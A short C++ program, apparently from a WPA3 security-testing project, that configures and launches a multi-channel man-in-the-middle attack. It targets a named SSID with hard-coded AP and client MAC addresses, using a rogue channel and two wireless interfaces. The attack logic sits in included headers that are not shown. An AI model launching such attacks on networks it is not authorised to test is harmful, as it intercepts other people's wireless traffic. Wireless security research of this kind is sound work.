#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/by_target/scan_AP.h"
#include "system/hw_capabilities.h"
#include "logger/log.h"

#include <tins/tins.h>
#include <filesystem>
#include <stdexcept>

using namespace std;
using namespace Tins;
using namespace wpa3_tester;

int main() {

    const string r_client_iface = "wlan1";
    const string r_ap_iface     = "wlan2";
    const string ap_ssid        = "test_channel_switch";
    const string ap_mac         = "78:98:e8:55:3e:8d";
    //const string client_mac     = "30:ab:6a:39:88:46";
    const string client_mac     = "a0:d7:68:10:25:6d";
    const int    real_channel   = 6;
    const int    rogue_channel  = 1;
    const int    attack_time    = 200;

    McMitm attack(r_client_iface, r_ap_iface, ap_ssid, ap_mac, client_mac);

    attack.netconfig.real_channel  = real_channel;
    attack.netconfig.rogue_channel = rogue_channel;
    attack.netconfig.ssid          = ap_ssid;

    attack.run(attack_time);

    return 0;
}